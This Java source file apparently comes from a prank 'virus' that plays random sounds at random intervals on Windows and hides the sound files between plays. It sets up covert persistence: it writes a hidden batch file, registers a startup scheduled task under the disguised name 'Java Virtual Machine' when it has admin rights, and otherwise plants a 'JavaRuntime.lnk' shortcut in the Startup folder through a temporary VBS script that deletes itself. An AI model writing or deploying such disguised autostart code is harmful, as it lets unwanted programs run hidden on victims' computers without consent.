package com.TeaFaris;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import static com.TeaFaris.Start.PATH_TO_VIRUS;

public class Actions {
    // A loop that plays a random sound at a random time between the numbers specified in the configuration file
    public void streamRandomSound(File inputConfig, String pathOut, String[] soundNames, boolean start) throws Exception {
        Random rand = new Random();
        ConfigurationWork configurationWork = new ConfigurationWork();
        FileHandling fileHandling = new FileHandling();
        String[] soundFrequency = configurationWork.getConfigPropertyArray(inputConfig, "playInterval");
        int lowestNumber = Integer.parseInt(soundFrequency[0]);
        int highestNumber = Integer.parseInt(soundFrequency[1]);
            while (start) {
                int randomTime = rand.nextInt(highestNumber - lowestNumber) + lowestNumber;
                switch (configurationWork.getConfigProperty(inputConfig, "timeUnit")) {
                    case "MINUTES" -> {
                        TimeUnit.MINUTES.sleep(randomTime);
                        break;
                    }
                    case "SECONDS" -> {
                        TimeUnit.SECONDS.sleep(randomTime);
                        break;
                    }
                    case "HOURS" -> {
                        TimeUnit.HOURS.sleep(randomTime);
                        break;
                    }
                    default -> {
                        System.err.println("Invalid time unit.");
                        System.err.println("USE: SECONDS, MINUTES or HOURS");
                        start = false;
                    }
                }
                int randomSound = rand.nextInt(fileHandling.getNumberOfSounds());
                File streamingSound = new File(pathOut + soundNames[randomSound]);
                FileHandling.hideOrShowFile(streamingSound, false);
                SoundStreaming.playSound(pathOut + soundNames[randomSound]);
                FileHandling.hideOrShowFile(streamingSound, true);
        }
    }
    // Adds the file to the autostart
    public void setStartup(boolean startup) throws Exception {
        if(startup) {
            File bat = new File(PATH_TO_VIRUS + "runtime.bat");
            FileHandling fileHandling = new FileHandling();
            final File jarFile = fileHandling.getJarFile();
            if(!bat.exists()) {
                // Creates a file(.bat), which will be used as a shortcut for the jar file.
                FileOutputStream fileOutputStream = new FileOutputStream(bat);
                String startCommand = "@cd/d \"%~dp0\"\n"
                        + "javaw -jar " + jarFile.getAbsolutePath();
                fileOutputStream.write(startCommand.getBytes(StandardCharsets.UTF_8));
                fileOutputStream.close();
                FileHandling.hideOrShowFile(bat, true);
            }
            if(isAdmin()) {
                // If the jar file is opened with administrator privileges, it will add the program to the schedule tasks.
                String createTask = "SCHTASKS /Create /SC ONSTART /TN Java Virtual Machine /TR " + bat.getAbsolutePath();
                Runtime.getRuntime().exec(createTask);
            } else {
                // If it opened without any privileges, it adds a shortcut to the startup folder
                File shortcut = new File(System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\JavaRuntime.lnk");
                if(!shortcut.exists()) {
                    createShortcut(bat.toString(), shortcut.toString());
                } else {
                    System.err.println("File already exist.");
                }
            }
        }
    }
    // Check what privileges the user has set to run the program.
    private boolean isAdmin() {
        final String programFiles = System.getenv("PROGRAMFILES");

        if (null == programFiles || programFiles.length() < 1) {
            System.err.println("Invalid OS.");
            System.exit(-1);
        }
        // Checks user privileges by trying to create a file in Program Files.
        File testFile = new File(programFiles);
        if (!testFile.canWrite()) {
            return false;
        }
        File fileTest = null;

        try {
            fileTest = File.createTempFile("check", ".dll", testFile);
        } catch (IOException e) {
            return false;
        } finally {
            if (fileTest != null) {
                fileTest.delete();
            }
        }
        return true;
    }

    /*
     * This part of the code is not mine.
     *
     * @author Jackson N. Brienen
     * Content Protected VIA GPL-2.0-only
     * https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html
     * Copyright (c) 2021 Jackson Nicholas Brienen
     * https://github.com/JacksonBrienen/VBS-Shortcut
     *
     * Thanks for the code Jackson!
     */
    private static void createShortcut(String source, String linkPath) throws FileNotFoundException {
        File sourceFile = new File(source);
        if(!sourceFile.exists()) {
            throw new FileNotFoundException("The Path: "+sourceFile.getAbsolutePath()+" does not exist!");
        }
        try {
            source = sourceFile.getAbsolutePath();

            String vbsCode = String.format(
                    "Set wsObj = WScript.CreateObject(\"WScript.shell\")%n"
                            + "scPath = \"%s\"%n"
                            + "Set scObj = wsObj.CreateShortcut(scPath)%n"
                            + "\tscObj.TargetPath = \"%s\"%n"
                            + "scObj.Save%n",
                    linkPath, source
            );

            newVBS(vbsCode);
        } catch (IOException | InterruptedException e) {
            System.err.println("Could not create and run VBS!");
            e.printStackTrace();
        }
    }

    /*
     * Creates a VBS file with the passed code and runs it, deleting it after the run has completed
     */
    private static void newVBS(String code) throws IOException, InterruptedException {
        File script = File.createTempFile("scvbs", ".vbs"); // File where script will be created

        // Writes to script file
        FileWriter writer = new FileWriter(script);
        writer.write(code);
        writer.close();

        Process p = Runtime.getRuntime().exec( "wscript \""+script.getAbsolutePath()+"\""); // executes vbs code via cmd
        p.waitFor(); // waits for process to finish
        if(!script.delete()) { // deletes script
            System.err.println("Warning Failed to delete tempory VBS File at: \""+script.getAbsolutePath()+"\"");
        }
    }
}